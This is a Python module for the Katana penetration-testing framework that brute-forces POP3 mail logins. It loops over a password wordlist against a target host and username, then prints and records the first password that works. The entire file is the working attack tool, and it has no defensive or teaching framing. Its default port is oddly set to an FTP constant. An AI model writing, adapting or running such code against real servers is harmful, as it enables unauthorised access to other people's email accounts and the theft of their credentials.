# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
import poplib
# END LIBRARIES

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.1"
	init.Description        ="Brute Force to POP protocol."
	init.CodeName           ="btf/pr.pop"
	init.DateCreation       ="22/03/2015"      
	init.LastModification   ="27/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[FTP_PORT            ,False,'Port Target'],
		'user'  :[USERNAME            ,True ,'Username target'],
		'dict'  :[DITIONARY_PASSWORDS ,False,'Wordlist']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
	Loadingfile(init.var['dict'])

	pop = poplib.POP3(init.var['target'],int(init.var['port'])) 

	with open(init.var['dict'],'r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			try:
				pop.user(init.var['user'])
				pop.pass_(password)
				if True:
					printk.suff("Successfully with ["+init.var['user']+"]["+password+"]\n")
					Space()
					UTIL.sRegister(init,password)
					return
					
			except:printk.inf(" | Checking '"+password+"'")

# END CODE MODULE ############################################################################################
